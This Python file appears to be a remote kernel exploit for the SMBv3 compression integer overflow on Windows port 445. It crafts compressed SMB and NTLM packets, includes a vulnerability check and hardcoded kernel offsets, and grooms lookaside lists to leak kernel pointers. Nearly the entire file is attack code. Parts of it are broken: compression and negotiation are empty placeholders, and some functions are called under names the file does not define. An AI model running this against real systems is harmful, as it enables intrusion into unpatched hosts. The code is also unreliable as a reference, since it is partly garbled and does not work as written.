import socket, struct, sys
import os, ctypes, threading

offsets = {
    'srvnet!SrvNetWskConnDispatch': 0x2D170,
    'srvnet!imp_IoSizeofWorkItem': 0x32210,
    'srvnet!imp_RtlCopyUnicodeString': 0x32288,
    'nt!IoSizeofWorkItem': 0x12C410,
    'nt!MiGetPteAddress': 0xBA968
}

# Dynamic value - larger size yields more reliable results, but less speed and higher chance for disconnect.
lookaside_related_iterations = 4

class smbv3_header:
    def __init__(self, command, message_id=0, session_id=0):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  
        # Must be set to 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = struct.pack('<H', command)
        self.credits_requested = b"\x00"*2  
        # Number of credits requested/granted
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  
        # Points to next message
        self.message_id = struct.pack('<Q', message_id)
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  
        # Changes for some commands
        self.session_id = struct.pack('<Q', session_id)
        self.signature = b"\x00"*16

    def get_packet(self): 
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class smbv3_negotiate_request:
    def __init__(self):
        self.header = smbv3_header(0)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  
        # 8 dialects
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  
        # 2 Contexts
        self.reserved_2 = b"\x00"*2
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" + b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  
        # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = b"\x00"*4
        
    def context(self, type, length):
        data_length = length
        reserved = b"\x00"*4
        return type + data_length + reserved
    
    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  
        # 1 hash algorithm
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  
        # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad
    
    def compression_context(self):
        # compression_algorithm_count = b"\x03\x00" ~ 3 compression algorithms
        compression_algorithm_count = b"\x01\x00"
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        #algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = b"\x01\x00"
        #length = b"\x0e\x00"
        length = b"\x0a\x00"
        context_header = self.context(b"\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms
    
    def get_packet(self):
        padding = b"\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding
    
class netBIOSwrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>I', len(data))[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data
    
class smbv3_compressed_transform_header:
    def __init__(self, data, offset, decompressed_size):
        self.data = data
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', decompressed_size)
        self.compression_algorithm = b"\x01\x00"
        self.flags = b"\x00"*2
        self.offset = struct.pack('<i', offset)

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data
    
class smbv3_session_setup_request:
    def __init__(self, message_id, buffer, session_id=0, padding=b''):
        self.header = smbv3_header(1, message_id, session_id)
        self.structure_size = b"\x19\x00"
        self.flags = b"\x00"
        self.security_mode = b"\x02"
        self.capabilities = b"\x00"*4
        self.channel = b"\x00"*4
        self.security_buffer_offset = struct.pack('<H', 0x58 + len(padding))
        self.security_buffer_length = struct.pack('<H', len(buffer))
        self.previous_session_id = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.padding = padding
        self.buffer = buffer

    def get_packet(self):
         return (self.header.get_packet() +
            self.structure_size +
            self.flags +
            self.security_mode +
            self.capabilities +
            self.channel +
            self.security_buffer_offset +
            self.security_buffer_length +
            self.previous_session_id +
            self.padding +
            self.buffer)

class smbv3_ntlm_negotiate:
    def __init__(self):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x01\x00\x00\x00"
        self.negotiate_flags = b"\x32\x90\x88\xe2"
        self.domain_name_len = b"\x00\x00"
        self.domain_name_max_len = b"\x00\x00"
        self.domain_name_buffer_offset = b"\x28\x00\x00\x00"
        self.workstation_len = b"\x00\x00"
        self.workstation_max_len = b"\x00\x00"
        self.workstation_buffer_offset = b"\x28\x00\x00\x00"
        self.version = b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"
        self.payload_domain_name = b""
        self.payload_workstation = b""

    def get_packet(self):
            return (self.signature +
            self.message_type +
            self.negotiate_flags +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.version +
            self.payload_domain_name +
            self.payload_workstation)

class smbv3_ntlm_authenticate:
    def __init__(self, timestamp, computer_name=b'', no_nt_challenge_trailing_reserved=False, padding=b''):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x03\x00\x00\x00"
        self.lm_challenge_response_len = b"\x00"*2
        self.lm_challenge_response_max_len = b"\x00"*2
        self.lm_challenge_response_buffer_offset = b"\x00"*4
        self.nt_challenge_response_len = b"\x00"*2  
        # will calculate later
        self.nt_challenge_response_max_len = b"\x00"*2  
        # will calculate later
        self.nt_challenge_response_buffer_offset = struct.pack('<I', 0x58 + len(padding))
        self.domain_name_len = b"\x00"*2
        self.domain_name_max_len = b"\x00"*2
        self.domain_name_buffer_offset = b"\x00"*4
        self.user_name_len = b"\x00"*2
        self.user_name_max_len = b"\x00"*2
        self.user_name_buffer_offset = b"\x00"*4
        self.workstation_len = b"\x00"*2
        self.workstation_max_len = b"\x00"*2
        self.workstation_buffer_offset = b"\x00"*4
        self.encrypted_random_session_key_len = b"\x01\x00"
        self.encrypted_random_session_key_max_len = b"\x01\x00"
        self.encrypted_random_session_key_buffer_offset = b"\x00"*4
        self.negotiate_flags = b"\x36\x82\x8a\xe2"
        self.version = b"\x00"*8
        self.mic = b"\x00"*16
        self.timestamp = timestamp
        self.computer_name = computer_name
        self.no_nt_challenge_trailing_reserved = no_nt_challenge_trailing_reserved
        self.padding = padding

    def nt_challenge_response(self):
        nt_proof_str = b"\x00"*16
        resp_type = b"\x01"
        hi_resp_type = b"\x01"
        reserved1 = b"\x00"*2
        reserved2 = b"\x00"*4
        timestamp_but_not_the_important_one = b"\x00"*8
        client_challenge = b"\x00"*8
        reserved3 = b"\x00"*4
        ntlmv2_client_challenge_timestamp = b"\x07\x00\x08\x00" + self.timestamp
        ntlmv2_client_challenge_domain_name = b"\x02\x00\x00\x00"
        ntlmv2_client_challenge_computer_name = b"\x01\x00" + struct.pack('<H', len(self.computer_name)) + self.computer_name
        ntlmv2_client_challenge_last = b"\x00"*4
        reserved4 = b"\x00"*4 if not self.no_nt_challenge_trailing_reserved else b""
        return (nt_proof_str +
            resp_type +
            hi_resp_type +
            reserved1 +
            reserved2 +
            timestamp_but_not_the_important_one +
            client_challenge +
            reserved3 +
            ntlmv2_client_challenge_timestamp +
            ntlmv2_client_challenge_domain_name +
            ntlmv2_client_challenge_computer_name +
            ntlmv2_client_challenge_last +
            reserved4)
    
    def get_packet(self):
        nt_challenge_response = self.nt_challenge_response()
        self.nt_challenge_response_len = struct.pack('<H', len(nt_challenge_response))
        self.nt_challenge_response_max_len = struct.pack('<H', len(nt_challenge_response))
        return (self.signature +
            self.message_type +
            self.lm_challenge_response_len +
            self.lm_challenge_response_max_len +
            self.lm_challenge_response_buffer_offset +
            self.nt_challenge_response_len +
            self.nt_challenge_response_max_len +
            self.nt_challenge_response_buffer_offset +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.user_name_len +
            self.user_name_max_len +
            self.user_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.encrypted_random_session_key_len +
            self.encrypted_random_session_key_max_len +
            self.encrypted_random_session_key_buffer_offset +
            self.negotiate_flags +
            self.version +
            self.mic +
            self.padding +
            nt_challenge_response)

    @staticmethod
    def send_compressed(sock, data, offset, original_decompressed_size):
        compressed = smbv3_compressed_transform_header(data, offset, original_decompressed_size).get_packet()
        packet = netBIOSwrapper(compressed).get_packet()
        sock.send(packet)
        reply_size = sock.recv(4)
        return sock.recv(struct.unpack('>I', reply_size)[0])

    @staticmethod
    def send_session_setup_with_ntlm_negotiate(sock):
        ntlm_negotiate = smbv3_negotiate_request().get_packet()
        session_setup = smbv3_session_setup_request(1, ntlm_negotiate).get_packet()
        return smbv3_ntlm_authenticate.send_compressed(sock, compress(session_setup), 0, len(session_setup))

    @staticmethod
    def send_session_setup_with_ntlm_authenticate(sock, session_id, timestamp):
        ntlm_negotiate = smbv3_ntlm_authenticate(timestamp).get_packet()
        session_setup = smbv3_session_setup_request(2, ntlm_negotiate, session_id).get_packet()
        return smbv3_ntlm_authenticate.send_compressed(sock, compress(session_setup), 0, len(session_setup))

    @staticmethod
    def connect_and_send_compressed(ip_address, data, offset, original_decompressed_size):
        with socket.socket(socket.AF_INET) as sock:
            sock.settimeout(30)
            sock.connect((ip_address, 445))
            send_negotiation(sock)
            try:
                return smbv3_ntlm_authenticate.send_compressed(sock, data, offset, original_decompressed_size)
            except ConnectionResetError:
                return None  # usually expected, just return

    @staticmethod
    def is_target_vulnerable(ip_address):
        ntlm_negotiate = smbv3_ntlm_negotiate().get_packet()
        session_setup = smbv3_session_setup_request(1, ntlm_negotiate).get_packet()
        # Trigger an integer overflow. A patched system will discard the packet.
        return smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, session_setup + b'\x00'*16, len(session_setup), -1) != None

    @staticmethod
    def connect_and_send_compressed_multiple_times(ip_address, data, offset, original_decompressed_size):
        for _ in range(lookaside_related_iterations):
            smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    @staticmethod
    def connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size):
        def thread_func():
            smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, b'A'*0x200, 0, 0x200)
        threads = []
        for _ in range(lookaside_related_iterations):
            t = threading.Thread(target=thread_func)
            threads.append(t)
            t.start()
        for _ in range(lookaside_related_iterations):
            smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        for t in threads:
            t.join()

    @staticmethod
    def leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, compare_to_byte):
        count1 = compare_to_byte + 3
        count2 = 0xFF + 3 - count1
        payload = b'\xb0' + b'\x00'*count1 + b'\xff'*count2
        offset = byte_offset - 0x50 + 1
        original_decompressed_size = ptr_list - offset
        data = b'B'*offset + compress(payload)
        data += b'\xff'*(0x4101 - len(data))
        smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        ntlm_negotiate = smbv3_ntlm_negotiate().get_packet()
        session_setup = smbv3_session_setup_request(1, ntlm_negotiate).get_packet()
        prev_ptr_list = (ptr_list - 0x100) // 2 + 0x100
        data = session_setup
        data += b'B'*(prev_ptr_list + 1 - 0x10 - len(data))
        offset = byte_offset - 0x60
        original_decompressed_size = 0x4101 - offset
        reply = smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        send_count = 1
        while reply != None and send_count < lookaside_related_iterations:
            reply = smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
            send_count += 1
        return reply == None

    @staticmethod
    def leak_ptr_byte(ip_address, byte_offset, ptr_list):
        attempts = 0
        while True:
            if attempts >= 3:
                return None
            attempts += 1
            low = 0x00
            high = 0xFF
            while low < high:
                mid = (low + high) // 2
                if smbv3_ntlm_authenticate.leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, mid):
                    low = mid + 1
                else:
                    high = mid
                print('.', end='', flush=True)
            if smbv3_ntlm_authenticate.leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, low):
                print(' ... ', end='', flush=True)
                continue
            if low > 0 and not smbv3_ntlm_authenticate.leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, low - 1):
                print(' ... ', end='', flush=True)
                continue
            break
        return low

    @staticmethod
    def leak_ptr(ip_address, ptr_offset, ptr_list):
        byte_values = []
        for byte_index in reversed(range(0, 6)):
            byte_value = smbv3_ntlm_authenticate.leak_ptr_byte(ip_address, ptr_offset + byte_index, ptr_list)
            if byte_value == None:
                return None
            byte_values.insert(0, byte_value)
        address = bytes(byte_values) + b'\xff\xff'
        address = struct.unpack('<Q', address)[0]
        if address == 0xFFFF000000000000:
            return None
        return address

def prepare_allocation_pool_ptr_to_leak(ip_address):
    # Fill the lookaside allocations with 0x00 values
    data = b'\x00'*0x2200  # request will go to 0x4100-sized lookaside list
    offset = 0
    original_decompressed_size = 0x10  # will be decompressed to 0x1100-sized lookaside list
    smbv3_ntlm_authenticate.connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Make so that a 0x2100-sized lookaside allocation will hold the pointer we'll leak
    data = b'A'*0x1101  # request will go to 0x2100-sized lookaside list
    offset = -0x10 + 0x2100 + 0x26  # will be decompressed to 0x4100-sized lookaside list
    original_decompressed_size = 0
    smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    ptr_offset = 0x50 + 0x2100 + 0x18 - 0x10  # absolute offset in the allocated block

    return ptr_offset, 0x4100

def leak_allocation_pool_object_ptr(ip_address):
    while True:
        ptr_offset, ptr_list = prepare_allocation_pool_ptr_to_leak(ip_address)
        address = leak_ptr(ip_address, ptr_offset, ptr_list)
        if address != None and (address & 0xFFF) == 0x050:
            return address - 0x50

        print('\nLeak failed, retrying')

def prepare_internet_connection_ptr_to_leak(ip_address):
    # Fill the lookaside allocations with 0x00 values. There's a lookaside list
    # per processor, and since we're going to have the data in only one of them,
    # make the rest hold known data.
    data = b'\x00'*0x1200  # request will go to 0x2100-sized lookaside list
    offset = 0
    original_decompressed_size = 0x10  # will be decompressed to 0x1100-sized lookaside list
    smbv3_ntlm_authenticate.connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Copy the pointer to a 0x2100-sized lookaside list allocation in 2 steps.
    # The compressed data is chosen so that the pointer will be placed in a
    # convenient location in the target buffer. Placing it it an offset which
    # is too low is problematic since we won't be able to use the buffer without
    # overriding the pointer in this case.
    # Step 1: Prepare the source by writing compressed data that will be used soon.
    data = b'\x10\xb0@ABCDEF\x1bPX\x00123456'  # 0x2B compressed bytes
    data = data[:-6]  # last 6 bytes will copy the pointer
    offset = 0x1100 - 0x10 - len(data)
    data = b'A'*offset + data  # request will go to 0x1100-sized lookaside list
    original_decompressed_size = 0x2B  # will be decompressed to 0x2100-sized lookaside list
    smbv3_ntlm_authenticate.connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Step 2: Actually copy the pointer now that we fool the victim as if the
    # compressed source data is large.
    data = b'A'*0x200  # request will go to 0x1100-sized lookaside list
    smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    ptr_offset = 0x50 + 0x1100 + 0x08  # absolute offset in the allocated block

    # Switch buffers.
    smbv3_ntlm_authenticate.connect_and_send_compressed(ip_address, b'A'*0x200, 0, 0x200)

    # Create a connection, and keep it alive to keep the relevant internet
    # connection object pointer hanging around until we leak it.
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(30)
    sock.connect((ip_address, 445))
    smbv3_ntlm_authenticate.send_negotiation(sock)

    # Send a valid session setup packet, so that the connection won't be dropped.
    ntlm_negotiate = smbv3_ntlm_negotiate().get_packet()
    session_setup = smbv3_session_setup_request(1, ntlm_negotiate).get_packet()
    data = session_setup
    data += b'A'*(0x200 - len(data))  # request will go to 0x1100-sized lookaside list
    offset = 0x1100  # will be decompressed to 0x1100-sized lookaside list
    original_decompressed_size = 0
    smbv3_ntlm_authenticate.send_compressed(sock, data, offset, original_decompressed_size)

    return ptr_offset, 0x2100, sock

# Placeholders for missing functions
def compress(data):
    # TODO: Implement actual compression logic as needed
    return data

def send_negotiation(sock):
    # TODO: Implement actual negotiation logic as needed
    pass

    